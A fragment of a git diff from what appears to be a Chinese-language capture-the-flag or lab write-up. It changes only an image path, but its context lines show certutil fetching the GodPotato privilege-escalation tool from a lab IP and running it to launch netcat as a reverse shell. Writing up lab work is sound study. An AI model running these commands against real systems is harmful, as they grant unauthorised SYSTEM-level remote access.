@@ -148,7 +148,7 @@ certutil -split -f -urlcache http://192.168.45.158/GodPotato-NET4.exe
 .\GodPotato-NEr4.exe -cmd "C:\Users\nathan\Nexus\nexus-3.21.0-05\nc64.exe 192.168.45.158 8888 -e cmd.exe"
 ```
 
-<figure><img src="../.gitbook/assets/30 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/30 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 获得ROOT flag：
 
